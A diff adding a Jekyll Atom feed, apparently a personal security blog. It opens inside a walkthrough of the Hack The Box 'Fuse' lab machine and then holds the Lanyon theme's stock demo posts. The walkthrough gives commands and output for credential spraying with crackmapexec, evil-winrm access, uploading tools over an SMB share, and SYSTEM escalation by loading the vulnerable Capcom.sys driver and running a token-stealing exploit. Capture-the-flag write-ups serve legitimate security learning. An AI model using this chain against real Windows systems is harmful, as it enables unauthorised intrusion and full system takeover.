+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There is match with the user &lt;strong&gt;&lt;cite&gt;svc-print&lt;/cite&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s try cme again but this time with winrm instead of smb.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cme winrm fuse &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; rpc-users &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$fab@s3Rv1ce$1'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;WINRM       10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
+WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Pwn3d!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;We can connect to the box with &lt;strong&gt;&lt;cite&gt;evil-winrm&lt;/cite&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.193 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; svc-print &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$fab@s3Rv1ce$1'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The user flag is inside the desktop folder!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;*Evil-WinRM* PS C:\Users\svc-print\Documents&amp;gt; gci \users\svc-print\desktop
+
+
+    Directory: C:\users\svc-print\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        11/5/2020   1:46 AM             34 user.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;By looking at the privileges, I can see that &lt;strong&gt;&lt;cite&gt;SeLoadDriverPrivilege&lt;/cite&gt;&lt;/strong&gt; is enable for our user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;*Evil-WinRM* PS C:\Users\svc-print\Documents&amp;gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A quick google search to find that &lt;a href=&quot;https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/&quot;&gt;article&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Basicaly, we have 2 steps to abuse that vulnerability:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Load a vulnerable driver (Capcom.sys) in the system;&lt;/li&gt;
+  &lt;li&gt;Exploit the driver to get an elevated shell.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;load-capcomsys-in-the-system&quot;&gt;Load Capcom.sys in the system&lt;/h3&gt;
+
+&lt;p&gt;To load the driver, we have to download the &lt;a href=&quot;https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp&quot;&gt;POC&lt;/a&gt; from TarlogicSecurity.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;wget https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then we need the &lt;a href=&quot;https://github.com/GregoryGraindorge/ExploitCapcomMod/blob/main/Capcom.sys&quot;&gt;driver&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;wget https://github.com/GregoryGraindorge/ExploitCapcomMod/blob/main/Capcom.sys&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The EOPLoadDriver.cpp is not compiled yet so we have to do it ourselves. If you don’t know how to do that, there is a nice post &lt;a href=&quot;https://stackoverflow.com/questions/19684190/how-to-compile-c-file-in-visual-studio&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now that we have compiled the EOPLoadDriver.cpp as LoadDriver.exe, we can just upload everything on the target machine.&lt;/p&gt;
+
+&lt;p&gt;Setup an SMB server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;smbserver.py rock &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-username&lt;/span&gt; rock &lt;span class=&quot;nt&quot;&gt;-password&lt;/span&gt; ThanksForReading &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Connect the target machine to the share.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;net use z: \\10.10.14.6\rock /USER:rock ThanksForReading&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Create a temp folder and copy LoadDriver.exe and Capcom.sys inside.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;cd \temp
+copy z:\LoadDriver.exe .
+copy z:\Capcom.sys .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Load the driver inside the system. &lt;strong&gt;(Don’t use double backslash !!!)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;C:\temp&amp;gt; .\LoadDriver.exe System\CurrentControlSet\ThanksForReading C:\temp\Capcom.sys
+
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\ThanksForReading
+NTSTATUS: c0000033, WinError: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;exploit-the-driver&quot;&gt;Exploit the driver&lt;/h3&gt;
+
+&lt;p&gt;To abuse the driver, we need to use this &lt;a href=&quot;https://github.com/tandasat/ExploitCapcom&quot;&gt;exploit&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;This is a standalone exploit for a vulnerable feature in Capcom.sys. The feature is exposed through IOCTL and to execute an arbitrary user supplied function pointer with disabling SMEP. This exploit simply abuses the feature to perform token stealing to get the SYSTEM privileges, and then launches the command prompt with the elevated privilege.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When running the exploit, it opens an elevated shell but the problem is that we don’t have a proper session on the target machine. Hence we need to adapt the exploit to fit our needs.&lt;/p&gt;
+
+&lt;p&gt;I created a modified version of the exploit that you can find &lt;a href=&quot;https://github.com/GregoryGraindorge/ExploitCapcomMod&quot;&gt;here&lt;/a&gt;. I already compiled it so if you don’t want to do it yourselve, juste download the latest release and run it on the target machine.&lt;/p&gt;
+
+&lt;p&gt;Long story short, I just modified the last function of the original program to execute a command instead of spawning a new shell.&lt;/p&gt;
+
+&lt;p&gt;To use it, download or compile ExploitCapcom.exe and upload it on the target machine. Then you can run a command like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.\ExploitCapcom.exe &quot;whoami&quot;
+
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000001D89AC60008
+[+] Shellcode was executed
+[+] Token stealing was successful
+nt authority\system&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.\ExploitCapcom.exe &quot;type \users\administrator\desktop\root.txt&quot;
+
+*Evil-WinRM* PS C:\temp&amp;gt; .\ExploitCapcom.exe &quot;type \users\administrator\desktop\root.txt&quot;
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000025BB0C20008
+[+] Shellcode was executed
+[+] Token stealing was successful
+a53127...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Rooted ;)&lt;/strong&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Introducing Lanyon</title>
+   <link href="http://localhost:2222/2020/04/03/introducing-lanyon/"/>
+   <updated>2020-04-03T00:00:00+02:00</updated>
+   <id>http://localhost:2222/2020/04/03/introducing-lanyon</id>
+   <content type="html">&lt;p&gt;Lanyon is an unassuming &lt;a href=&quot;http://jekyllrb.com&quot;&gt;Jekyll&lt;/a&gt; theme that places content first by tucking away navigation in a hidden drawer. It’s based on &lt;a href=&quot;http://getpoole.com&quot;&gt;Poole&lt;/a&gt;, the Jekyll butler.&lt;/p&gt;
+
+&lt;h3 id=&quot;built-on-poole&quot;&gt;Built on Poole&lt;/h3&gt;
+
+&lt;p&gt;Poole is the Jekyll Butler, serving as an upstanding and effective foundation for Jekyll themes by &lt;a href=&quot;https://twitter.com/mdo&quot;&gt;@mdo&lt;/a&gt;. Poole, and every theme built on it (like Lanyon here) includes the following:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Complete Jekyll setup included (layouts, config, &lt;a href=&quot;/404&quot;&gt;404&lt;/a&gt;, &lt;a href=&quot;/atom.xml&quot;&gt;RSS feed&lt;/a&gt;, posts, and &lt;a href=&quot;/about&quot;&gt;example page&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;Mobile friendly design and development&lt;/li&gt;
+  &lt;li&gt;Easily scalable text and component sizing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rem&lt;/code&gt; units in the CSS&lt;/li&gt;
+  &lt;li&gt;Support for a wide gamut of HTML elements&lt;/li&gt;
+  &lt;li&gt;Related posts (time-based, because Jekyll) below each post&lt;/li&gt;
+  &lt;li&gt;Syntax highlighting, courtesy Pygments (the Python-based code snippet highlighter)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;lanyon-features&quot;&gt;Lanyon features&lt;/h3&gt;
+
+&lt;p&gt;In addition to the features of Poole, Lanyon adds the following:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Toggleable sliding sidebar (built with only CSS) via &lt;strong&gt;☰&lt;/strong&gt; link in top corner&lt;/li&gt;
+  &lt;li&gt;Sidebar includes support for textual modules and a dynamically generated navigation with active link support&lt;/li&gt;
+  &lt;li&gt;Two orientations for content and sidebar, default (left sidebar) and &lt;a href=&quot;https://github.com/poole/lanyon#reverse-layout&quot;&gt;reverse&lt;/a&gt; (right sidebar), available via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt; classes&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/poole/lanyon#themes&quot;&gt;Eight optional color schemes&lt;/a&gt;, available via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt; classes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/poole/lanyon#readme&quot;&gt;Head to the readme&lt;/a&gt; to learn more.&lt;/p&gt;
+
+&lt;h3 id=&quot;browser-support&quot;&gt;Browser support&lt;/h3&gt;
+
+&lt;p&gt;Lanyon is by preference a forward-thinking project. In addition to the latest versions of Chrome, Safari (mobile and desktop), and Firefox, it is only compatible with Internet Explorer 9 and above.&lt;/p&gt;
+
+&lt;h3 id=&quot;download&quot;&gt;Download&lt;/h3&gt;
+
+&lt;p&gt;Lanyon is developed on and hosted with GitHub. Head to the &lt;a href=&quot;https://github.com/poole/lanyon&quot;&gt;GitHub repository&lt;/a&gt; for downloads, bug reports, and features requests.&lt;/p&gt;
+
+&lt;p&gt;Thanks!&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Example content</title>
+   <link href="http://localhost:2222/2020/04/02/example-content/"/>
+   <updated>2020-04-02T00:00:00+02:00</updated>
+   <id>http://localhost:2222/2020/04/02/example-content</id>
+   <content type="html">&lt;div class=&quot;message&quot;&gt;
+  Howdy! This is an example blog post that shows several types of HTML content supported in this theme.
+&lt;/div&gt;
+
+&lt;p&gt;Cum sociis natoque penatibus et magnis &lt;a href=&quot;#&quot;&gt;dis parturient montes&lt;/a&gt;, nascetur ridiculus mus. &lt;em&gt;Aenean eu leo quam.&lt;/em&gt; Pellentesque ornare sem lacinia quam venenatis vestibulum. Sed posuere consectetur est at lobortis. Cras mattis consectetur purus sit amet fermentum.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Etiam porta &lt;strong&gt;sem malesuada magna&lt;/strong&gt; mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.&lt;/p&gt;
+
+&lt;h2 id=&quot;inline-html-elements&quot;&gt;Inline HTML elements&lt;/h2&gt;
+
+&lt;p&gt;HTML defines a long list of available inline tags, a complete list of which can be found on the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTML/Element&quot;&gt;Mozilla Developer Network&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;To bold text&lt;/strong&gt;, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;strong&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;To italicize text&lt;/em&gt;, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;em&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Abbreviations, like &lt;abbr title=&quot;HyperText Markup Langage&quot;&gt;HTML&lt;/abbr&gt; should use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;abbr&amp;gt;&lt;/code&gt;, with an optional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;title&lt;/code&gt; attribute for the full phrase.&lt;/li&gt;
+  &lt;li&gt;Citations, like &lt;cite&gt;— Mark otto&lt;/cite&gt;, should use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;cite&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;del&gt;Deleted&lt;/del&gt; text should use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;del&amp;gt;&lt;/code&gt; and &lt;ins&gt;inserted&lt;/ins&gt; text should use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;ins&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Superscript &lt;sup&gt;text&lt;/sup&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;sup&amp;gt;&lt;/code&gt; and subscript &lt;sub&gt;text&lt;/sub&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;sub&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Most of these elements are styled by browsers with few modifications on our part.&lt;/p&gt;
+
+&lt;h2 id=&quot;heading&quot;&gt;Heading&lt;/h2&gt;
+
+&lt;p&gt;Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor. Duis mollis, est non commodo luctus, nisi erat porttitor ligula, eget lacinia odio sem nec elit. Morbi leo risus, porta ac consectetur ac, vestibulum at eros.&lt;/p&gt;
+
+&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
+
+&lt;p&gt;Cum sociis natoque penatibus et magnis dis &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code element&lt;/code&gt; montes, nascetur ridiculus mus.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// Example can be run directly in your JavaScript console
+&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Create a function that takes two arguments and returns the sum of those arguments
+&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;adder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;return a + b&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Call the function
+&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;adder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// &amp;gt; 8&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa.&lt;/p&gt;
+
+&lt;h3 id=&quot;lists&quot;&gt;Lists&lt;/h3&gt;
+
+&lt;p&gt;Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Praesent commodo cursus magna, vel scelerisque nisl consectetur et.&lt;/li&gt;
+  &lt;li&gt;Donec id elit non mi porta gravida at eget metus.&lt;/li&gt;
+  &lt;li&gt;Nulla vitae elit libero, a pharetra augue.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Donec ullamcorper nulla non metus auctor fringilla. Nulla vitae elit libero, a pharetra augue.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Vestibulum id ligula porta felis euismod semper.&lt;/li&gt;
+  &lt;li&gt;Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.&lt;/li&gt;
+  &lt;li&gt;Maecenas sed diam eget risus varius blandit sit amet non magna.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Cras mattis consectetur purus sit amet fermentum. Sed posuere consectetur est at lobortis.&lt;/p&gt;
+
+&lt;dl&gt;
+  &lt;dt&gt;HyperText Markup Language (HTML)&lt;/dt&gt;
+  &lt;dd&gt;The language used to describe and define the content of a Web page&lt;/dd&gt;
+
+  &lt;dt&gt;Cascading Style Sheets (CSS)&lt;/dt&gt;
+  &lt;dd&gt;Used to describe the appearance of Web content&lt;/dd&gt;
+
+  &lt;dt&gt;JavaScript (JS)&lt;/dt&gt;
+  &lt;dd&gt;The programming language used to build advanced Web sites and applications&lt;/dd&gt;
+&lt;/dl&gt;
+
+&lt;p&gt;Integer posuere erat a ante venenatis dapibus posuere velit aliquet. Morbi leo risus, porta ac consectetur ac, vestibulum at eros. Nullam quis risus eget urna mollis ornare vel eu leo.&lt;/p&gt;
+
+&lt;h3 id=&quot;tables&quot;&gt;Tables&lt;/h3&gt;
+
+&lt;p&gt;Aenean lacinia bibendum nulla sed consectetur. Lorem ipsum dolor sit amet, consectetur adipiscing elit.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Name&lt;/th&gt;
+      &lt;th&gt;Upvotes&lt;/th&gt;
+      &lt;th&gt;Downvotes&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tfoot&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Totals&lt;/td&gt;
+      &lt;td&gt;21&lt;/td&gt;
+      &lt;td&gt;23&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tfoot&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Alice&lt;/td&gt;
+      &lt;td&gt;10&lt;/td&gt;
+      &lt;td&gt;11&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Bob&lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Charlie&lt;/td&gt;
+      &lt;td&gt;7&lt;/td&gt;
+      &lt;td&gt;9&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Nullam id dolor id nibh ultricies vehicula ut id elit. Sed posuere consectetur est at lobortis. Nullam quis risus eget urna mollis ornare vel eu leo.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/poole/poole/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>What's Jekyll?</title>
+   <link href="http://localhost:2222/2020/04/01/whats-jekyll/"/>
+   <updated>2020-04-01T00:00:00+02:00</updated>
+   <id>http://localhost:2222/2020/04/01/whats-jekyll</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;https://jekyllrb.com&quot;&gt;Jekyll&lt;/a&gt; is a static site generator, an open-source tool for creating simple yet powerful websites of all shapes and sizes. From &lt;a href=&quot;https://github.com/mojombo/jekyll/blob/master/README.markdown&quot;&gt;the project’s readme&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Jekyll is a simple, blog aware, static site generator. It takes a template directory […] and spits out a complete, static website suitable for serving with Apache or your favorite web server. This is also the engine behind GitHub Pages, which you can use to host your project’s page or blog right here from GitHub.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It’s an immensely useful tool and one we encourage you to use here with Lanyon.&lt;/p&gt;
+
+&lt;p&gt;Find out more by &lt;a href=&quot;https://github.com/mojombo/jekyll&quot;&gt;visiting the project on GitHub&lt;/a&gt;.&lt;/p&gt;
+</content>
+ </entry>
+ 
+
+</feed>
